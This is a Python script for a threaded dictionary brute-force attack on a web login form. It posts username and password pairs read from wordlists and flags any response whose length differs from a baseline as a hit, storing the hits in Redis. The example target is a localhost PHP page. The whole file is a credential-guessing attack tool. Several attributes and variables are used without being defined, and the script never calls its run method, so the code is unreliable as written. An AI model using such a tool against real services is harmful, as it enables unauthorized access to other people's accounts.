import requests
import threading
import time
import redis

headers ={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,'
                  ' like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
}


class BurpUser:
    def __init__(self, url, savepool, u_p='username', p_p='password'):
        self.threadnum = 100
        self.url = url
        self.user_param = u_p
        self.pass_param = p_p
        self.load_dict()
        self.threadmax = threading.BoundedSemaphore(self.threadnum)
        self.savepool = savepool
        self.finished = False
        self.redis_connnect()

    def load_dict(self):
        self.user = [i.strip('\n') for i in open('dict/user.txt', encoding='utf-8').readlines()]
        self.password = [i.strip('\n') for i in open('dict/password.txt', encoding='utf-8').readlines()]

    def request_one(self, user, password, sp_dict,len_cont):
        data = {self.user_param:user, self.pass_param: password}
        try:
            r = requests.post(self.url, data=data, headers=headers)
            if len(r.content) != self.default_length:
                print('[Success] I found it  username - %s | password %s' % (user, password))
                sp_dict[user] = password
                len_cont.append(len(r.content))
                self.found = True
                self.burp_user_args.hset('burp_user', 'user', user)
                self.burp_user_args.hset('burp_user', 'password', password)
               
        except Exception as e:
            print('[Warning] timeout, the thread will be restart after 10s ')
            print(e)
            time.sleep(10)
        self.threadmax.release()

    def burp(self):
        th = []
        special_dict = {}
        content = []
        for _ in self.user:
            i = self.user.pop()
            for j in self.password:
                if self.found: return
                self.threadmax.acquire()
                t = threading.Thread(target=self.request_one, args=(i, j, special_dict, content))
                t.start()
                th.append(t)

        for t in th:
            t.join()

    def is_finished(self):
        return self.finished

    def redis_connnect(self):
        self.burp_user_redis = redis.Redis(connection_pool=self.savepool)
        
    def run(self):
        self.action = self.burp_user_redis.hget('base', 'burp_user_args')
        if self.url:
            self.url = self.burp_user_redis.hget('base', 'login_url')
        self.default_length = len(requests.post(self.url, headers=headers,
                                            data={u_p: '', p_p: ''}).content)    
        if self.action == 'burp':
            self.burp()
            

if __name__ == '__main__':
    save_pool = redis.ConnectionPool(host='127.0.0.1', port=6379, decode_responses=True)
    burp = BurpUser('http://127.0.0.1/index.php', savepool=save_pool)
    
    

